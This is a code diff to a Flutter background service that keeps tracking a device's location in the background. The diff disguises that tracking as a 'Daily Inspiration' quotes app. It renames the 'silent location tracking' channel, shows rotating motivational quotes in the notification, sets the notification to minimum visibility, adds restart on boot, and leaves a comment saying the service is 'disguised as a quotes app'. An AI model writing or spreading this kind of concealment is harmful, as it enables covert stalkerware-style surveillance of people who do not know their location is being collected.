@@ -1,5 +1,6 @@
 import 'dart:async';
 import 'dart:convert';
+import 'dart:math';
 import 'dart:ui';
 import 'package:flutter/material.dart';
 import 'package:flutter_background_service/flutter_background_service.dart';
@@ -8,18 +9,50 @@ import 'package:geolocator/geolocator.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import 'api_service.dart';
 
-const notificationChannelId = 'locus_tracking';
+const notificationChannelId = 'locus_quotes';
 const notificationId = 888;
 const queueKey = 'offline_location_queue';
+const serviceRestartKey = 'service_should_be_running';
+
+// Inspirational quotes to display in the notification
+const List<String> _quotes = [
+  "The only way to do great work is to love what you do.",
+  "Innovation distinguishes between a leader and a follower.",
+  "Stay hungry, stay foolish.",
+  "Life is what happens when you're busy making other plans.",
+  "The future belongs to those who believe in the beauty of their dreams.",
+  "In the middle of difficulty lies opportunity.",
+  "Success is not final, failure is not fatal.",
+  "Be yourself; everyone else is already taken.",
+  "The best time to plant a tree was 20 years ago. The second best time is now.",
+  "Do what you can, with what you have, where you are.",
+  "It does not matter how slowly you go as long as you do not stop.",
+  "Everything you've ever wanted is on the other side of fear.",
+  "Believe you can and you're halfway there.",
+  "The only impossible journey is the one you never begin.",
+  "What lies behind us and what lies before us are tiny matters.",
+  "Happiness is not something ready made. It comes from your own actions.",
+  "Turn your wounds into wisdom.",
+  "The mind is everything. What you think you become.",
+  "An unexamined life is not worth living.",
+  "We become what we think about.",
+];
+
+String _getRandomQuote() {
+  return _quotes[Random().nextInt(_quotes.length)];
+}
 
 Future<void> initializeService() async {
   final service = FlutterBackgroundService();
 
   const AndroidNotificationChannel channel = AndroidNotificationChannel(
     notificationChannelId,
-    'Locus Tracking Service',
-    description: 'This channel is used for silent location tracking.',
-    importance: Importance.low, // Silent notification
+    'Daily Inspiration',
+    description: 'Inspirational quotes to brighten your day.',
+    importance: Importance.min, // Minimum importance - no sound, no popup
+    showBadge: false,
+    enableVibration: false,
+    playSound: false,
   );
 
   final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
@@ -36,9 +69,10 @@ Future<void> initializeService() async {
       autoStart: false,
       isForegroundMode: true,
       notificationChannelId: notificationChannelId,
-      initialNotificationTitle: 'Locus',
-      initialNotificationContent: 'Service active',
+      initialNotificationTitle: 'Daily Inspiration',
+      initialNotificationContent: _getRandomQuote(),
       foregroundServiceNotificationId: notificationId,
+      autoStartOnBoot: true, // Auto restart on boot
     ),
     iosConfiguration: IosConfiguration(
       autoStart: false,
@@ -68,13 +102,27 @@ void onStart(ServiceInstance service) async {
     service.stopSelf();
   });
 
-  // Update notification silently
+  // Show an inspirational quote in the notification (disguised as a quotes app)
   if (service is AndroidServiceInstance) {
     service.setForegroundNotificationInfo(
-      title: "Locus",
-      content: "Silent tracking active",
+      title: "✨ Daily Inspiration",
+      content: _getRandomQuote(),
     );
+    
+    // Mark service as running for restart capability
+    final prefs = await SharedPreferences.getInstance();
+    await prefs.setBool(serviceRestartKey, true);
   }
+
+  // Change quote periodically (every 5 minutes)
+  Timer.periodic(const Duration(minutes: 5), (timer) async {
+    if (service is AndroidServiceInstance) {
+      service.setForegroundNotificationInfo(
+        title: "✨ Daily Inspiration",
+        content: _getRandomQuote(),
+      );
+    }
+  });
 
   Timer.periodic(const Duration(seconds: 20), (timer) async {
     final prefs = await SharedPreferences.getInstance();
@@ -129,7 +177,20 @@ void onStart(ServiceInstance service) async {
       }
     } else {
        // No active session, stop service
+       final prefs = await SharedPreferences.getInstance();
+       await prefs.setBool(serviceRestartKey, false);
        service.stopSelf();
     }
   });
+}
+
+// Helper to check if service should restart
+Future<bool> shouldServiceRestart() async {
+  final prefs = await SharedPreferences.getInstance();
+  return prefs.getBool(serviceRestartKey) ?? false;
+}
+
+// Helper to request battery optimization exemption
+Future<void> requestBatteryOptimizationExemption() async {
+  // This is handled in the main app via permission_handler or similar
 }
